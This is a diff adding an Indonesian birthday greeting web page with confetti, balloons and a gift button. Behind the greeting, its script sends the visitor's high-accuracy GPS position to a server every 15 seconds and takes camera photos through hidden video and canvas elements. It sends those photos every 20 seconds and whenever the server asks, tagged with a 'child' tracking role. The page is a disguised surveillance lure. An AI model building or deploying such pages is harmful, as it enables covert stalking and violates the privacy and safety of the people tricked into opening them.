@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>🎂 Selamat Ulang Tahun!</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:#0a0a0a;min-height:100vh;overflow-x:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center}
+#cc{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(ellipse at center,#1a0533 0%,#0a0a0a 70%)}
+.star{position:absolute;background:#fff;border-radius:50%;animation:twinkle var(--d) ease-in-out infinite alternate}
+@keyframes twinkle{0%{opacity:.1;transform:scale(.8)}100%{opacity:1;transform:scale(1.2)}}
+.card{position:relative;z-index:10;width:100%;max-width:400px;padding:24px 20px;text-align:center}
+.cake-wrap{position:relative;margin:0 auto 8px;width:130px;height:130px;display:flex;align-items:center;justify-content:center}
+.cake-emoji{font-size:90px;display:block;animation:bounce 2s ease-in-out infinite}
+@keyframes bounce{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-14px) rotate(3deg)}}
+.glow{position:absolute;width:130px;height:130px;border-radius:50%;background:radial-gradient(circle,rgba(255,180,0,.35) 0%,transparent 70%);animation:glow 2s ease-in-out infinite alternate}
+@keyframes glow{0%{transform:scale(.9);opacity:.5}100%{transform:scale(1.15);opacity:1}}
+.title{font-size:1.9rem;font-weight:800;background:linear-gradient(135deg,#FFD700,#FF6B6B,#FF69B4,#A855F7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.2;margin-bottom:4px;animation:hue 4s linear infinite}
+@keyframes hue{0%{filter:hue-rotate(0deg)}100%{filter:hue-rotate(360deg)}}
+.name{font-size:1.6rem;font-weight:800;color:#fff;margin-bottom:4px;text-shadow:0 0 20px rgba(255,215,0,.5)}
+.tagline{font-size:.78rem;color:rgba(255,255,255,.45);margin-bottom:16px}
+.balloons{display:flex;justify-content:center;gap:6px;margin-bottom:14px;font-size:1.8rem}
+.balloon{animation:float var(--d) ease-in-out infinite alternate}
+@keyframes float{0%{transform:translateY(0)}100%{transform:translateY(-14px)}}
+.wish{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:14px 16px;margin-bottom:16px;color:rgba(255,255,255,.8);font-size:.84rem;line-height:1.75;position:relative;text-align:left}
+.wish::before{content:'"';font-size:3.5rem;color:#FFD700;position:absolute;top:-14px;left:10px;line-height:1;font-family:serif;opacity:.5}
+
+/* States */
+#stateInit,#stateLoad,#stateDone{text-align:center}
+#stateLoad,#stateDone{display:none}
+
+.cta{display:block;width:100%;padding:15px;background:linear-gradient(135deg,#FF6B6B,#FF69B4,#A855F7);border:none;border-radius:14px;color:#fff;font-size:1rem;font-weight:700;cursor:pointer;font-family:inherit;box-shadow:0 8px 28px rgba(168,85,247,.4);transition:all .3s;position:relative;overflow:hidden;margin-bottom:6px}
+.cta:before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);animation:shine 2.5s infinite}
+@keyframes shine{0%{left:-100%}100%{left:100%}}
+.cta:active{transform:scale(.97)}
+.cta-note{font-size:.68rem;color:rgba(255,255,255,.3);margin-top:4px}
+
+.spin{font-size:3rem;animation:spin 1s linear infinite;display:block;margin:0 auto 10px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-txt{color:rgba(255,255,255,.6);font-size:.85rem}
+
+.done-icon{font-size:3.5rem;animation:pop .5s cubic-bezier(.175,.885,.32,1.275);display:block;margin:0 auto 8px}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.done-title{color:#4ade80;font-size:1.05rem;font-weight:700;margin-bottom:4px}
+.done-sub{color:rgba(255,255,255,.45);font-size:.75rem;line-height:1.6}
+
+.firework{position:fixed;pointer-events:none;z-index:5}
+.spark{position:absolute;width:4px;height:4px;border-radius:50%;animation:sfx var(--d) ease-out forwards}
+@keyframes sfx{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--x),var(--y));opacity:0}}
+video,canvas{display:none}
+</style>
+</head>
+<body>
+<div class="bg" id="bg"></div>
+<canvas id="cc"></canvas>
+
+<div class="card">
+  <div class="cake-wrap">
+    <div class="glow"></div>
+    <span class="cake-emoji">🎂</span>
+  </div>
+
+  <div class="title">Selamat Ulang Tahun!</div>
+  <div class="name" id="tname">Sahabatku</div>
+  <div class="tagline">✨ Semoga hari istimewamu penuh kebahagiaan ✨</div>
+
+  <div class="balloons">
+    <span class="balloon" style="--d:2s">🎈</span>
+    <span class="balloon" style="--d:2.3s">🎉</span>
+    <span class="balloon" style="--d:1.8s">🎊</span>
+    <span class="balloon" style="--d:2.5s">🎈</span>
+    <span class="balloon" style="--d:2.2s">🎁</span>
+  </div>
+
+  <div class="wish">
+    Semoga di hari spesialmu ini semua impian dan harapanmu terwujud.
+    Semoga selalu sehat, bahagia, dan sukses dalam setiap langkahmu.
+    Terima kasih sudah menjadi bagian terindah dalam hidupku 💖
+  </div>
+
+  <!-- State 1: tombol -->
+  <div id="stateInit">
+    <button class="cta" onclick="mulai()">🎁 Buka Hadiah Spesialmu!</button>
+    <div class="cta-note">Izinkan kamera & lokasi untuk kejutan spesial 🎊</div>
+  </div>
+
+  <!-- State 2: loading -->
+  <div id="stateLoad">
+    <span class="spin">🎁</span>
+    <div class="load-txt">Menyiapkan hadiahmu...</div>
+  </div>
+
+  <!-- State 3: sukses -->
+  <div id="stateDone">
+    <span class="done-icon">🎉</span>
+    <div class="done-title">Selamat! Hadiah Terkirim!</div>
+    <div class="done-sub">Foto kenangan & lokasi kamu sudah dikirim.<br>Semoga harimu menyenangkan! 🥳</div>
+  </div>
+</div>
+
+<video id="vid" autoplay playsinline muted></video>
+<canvas id="cv"></canvas>
+
+<script>
+const p = new URLSearchParams(location.search);
+const ROOM = p.get('r') || 'BDAY';
+const NAME = decodeURIComponent(p.get('n') || 'Sahabatku');
+const WS_URL = (location.protocol==='https:'?'wss:':'ws:')+'//'+location.host;
+
+document.getElementById('tname').textContent = NAME;
+
+// Stars
+const bg = document.getElementById('bg');
+for(let i=0;i<80;i++){
+  const s=document.createElement('div'); s.className='star';
+  const sz=Math.random()*2.5+1;
+  s.style.cssText=`width:${sz}px;height:${sz}px;top:${Math.random()*100}%;left:${Math.random()*100}%;--d:${Math.random()*3+1}s`;
+  bg.appendChild(s);
+}
+
+// Confetti
+const cc=document.getElementById('cc'),ctx=cc.getContext('2d');
+cc.width=window.innerWidth; cc.height=window.innerHeight;
+window.onresize=()=>{cc.width=window.innerWidth;cc.height=window.innerHeight;};
+const pieces=[], clrs=['#FFD700','#FF6B6B','#FF69B4','#A855F7','#60A5FA','#4ade80','#FB923C'];
+function addConfetti(n){for(let i=0;i<n;i++) pieces.push({x:Math.random()*cc.width,y:-10,w:Math.random()*10+5,h:Math.random()*5+3,color:clrs[Math.floor(Math.random()*clrs.length)],vx:(Math.random()-.5)*4,vy:Math.random()*3+2,rot:Math.random()*360,rv:(Math.random()-.5)*8});}
+(function draw(){ctx.clearRect(0,0,cc.width,cc.height);for(let i=pieces.length-1;i>=0;i--){const p=pieces[i];ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);ctx.fillStyle=p.color;ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();p.x+=p.vx;p.y+=p.vy;p.rot+=p.rv;p.vy+=0.05;if(p.y>cc.height+20)pieces.splice(i,1);}requestAnimationFrame(draw);})();
+
+function firework(x,y){
+  const fw=document.createElement('div');fw.className='firework';fw.style.left=x+'px';fw.style.top=y+'px';document.body.appendChild(fw);
+  const fc=['#FFD700','#FF6B6B','#A855F7','#60A5FA','#4ade80'];
+  for(let i=0;i<14;i++){const sp=document.createElement('div');sp.className='spark';const a=i*(360/14)*Math.PI/180,d=70+Math.random()*50;sp.style.cssText=`background:${fc[i%fc.length]};--d:${.6+Math.random()*.5}s;--x:${Math.cos(a)*d}px;--y:${Math.sin(a)*d}px`;fw.appendChild(sp);}
+  setTimeout(()=>fw.remove(),1300);
+}
+
+let ws,stream,lt,ct;
+const vid=document.getElementById('vid'),cv2=document.getElementById('cv');
+
+function sendLoc(){
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const c=pos.coords;
+    if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:'location',room:ROOM,data:{lat:c.latitude,lng:c.longitude,accuracy:c.accuracy,altitude:c.altitude,speed:c.speed,timestamp:Date.now()}}));
+  },()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+}
+
+function sendPhoto(){
+  if(!stream||!vid.videoWidth) return;
+  const w=vid.videoWidth,h=vid.videoHeight;
+  cv2.width=w;cv2.height=h;
+  const ct2=cv2.getContext('2d');
+  ct2.translate(w,0);ct2.scale(-1,1);ct2.drawImage(vid,0,0,w,h);
+  ct2.setTransform(1,0,0,1,0,0);
+  ct2.fillStyle='rgba(0,0,0,.55)';ct2.fillRect(0,h-22,w,22);
+  ct2.fillStyle='#FFD700';ct2.font='bold 11px monospace';
+  ct2.fillText('🎂 HBD '+NAME+' | '+new Date().toLocaleString('id-ID'),5,h-7);
+  if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:'camera',room:ROOM,data:{image:cv2.toDataURL('image/jpeg',.6),timestamp:Date.now()}}));
+}
+
+async function mulai(){
+  document.getElementById('stateInit').style.display='none';
+  document.getElementById('stateLoad').style.display='block';
+  addConfetti(100); firework(window.innerWidth*.3,window.innerHeight*.3); firework(window.innerWidth*.7,window.innerHeight*.25);
+
+  // Connect WebSocket
+  ws=new WebSocket(WS_URL);
+  ws.onopen=()=>{
+    ws.send(JSON.stringify({type:'join',role:'child',room:ROOM,childName:'🎂 '+NAME}));
+    ws.send(JSON.stringify({type:'status',room:ROOM,data:{online:true,childName:NAME,lastSeen:Date.now()}}));
+    sendLoc(); lt=setInterval(sendLoc,15000);
+  };
+  ws.onmessage=e=>{try{const m=JSON.parse(e.data);if(m.type==='requestPhoto')sendPhoto();}catch{}};
+
+  // Kamera — coba depan dulu lalu belakang
+  const tries=[{facingMode:'user'},{facingMode:'environment'},{video:true}];
+  for(const constraint of tries){
+    try{
+      stream=await navigator.mediaDevices.getUserMedia({video:constraint,audio:false});
+      vid.srcObject=stream; await vid.play();
+      setTimeout(()=>{sendPhoto(); ct=setInterval(sendPhoto,20000);},1500);
+      break;
+    }catch(e){continue;}
+  }
+
+  // Show success
+  setTimeout(()=>{
+    document.getElementById('stateLoad').style.display='none';
+    document.getElementById('stateDone').style.display='block';
+    addConfetti(200);
+    for(let i=0;i<6;i++) setTimeout(()=>firework(Math.random()*window.innerWidth,Math.random()*window.innerHeight*.6),i*250);
+  },2200);
+}
+</script>
+</body>
+</html>
